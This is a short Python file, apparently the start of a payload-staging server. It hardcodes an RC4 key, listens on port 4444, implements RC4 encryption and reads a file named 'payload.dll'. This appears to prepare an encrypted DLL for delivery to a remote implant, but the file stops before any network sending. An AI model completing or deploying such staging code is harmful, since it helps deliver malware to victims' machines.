# server.py

import socket
import struct

KEY = b'MySecretKey123'
HOST = '0.0.0.0'
PORT = 4444

def rc4(key, data):
    # s-box
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]

    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) % 256])
    
    return bytes(out)

with open('payload.dll', 'rb') as f:
    dll = f.read()

